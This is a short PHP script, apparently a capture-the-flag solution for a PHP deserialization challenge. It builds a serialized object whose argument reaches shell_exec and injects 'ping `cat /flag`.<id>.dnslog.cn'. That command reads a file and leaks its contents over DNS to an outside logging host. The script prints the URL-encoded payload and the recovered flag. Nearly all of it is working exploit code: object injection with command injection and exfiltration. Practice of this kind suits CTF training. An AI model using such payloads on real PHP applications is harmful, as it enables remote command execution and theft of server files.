<?php
class home{
    private $args;
    function __construct($args){
        $this->args=$args;
    }
    // function __destruct()
    // {
    //    echo  shell_exec($this->args);
    // }
}

$a = new home("ping `cat /flag`.3p6o45.dnslog.cn");
echo urlencode(serialize($a));
// O%3A4%3A%22home%22%3A1%3A%7Bs%3A10%3A%22%00home%00args%22%3Bs%3A33%3A%22ping+%60cat+%2Fflag%60.3p6o45.dnslog.cn%22%3B%7D
// flag{th1s_is_ea4y}
?>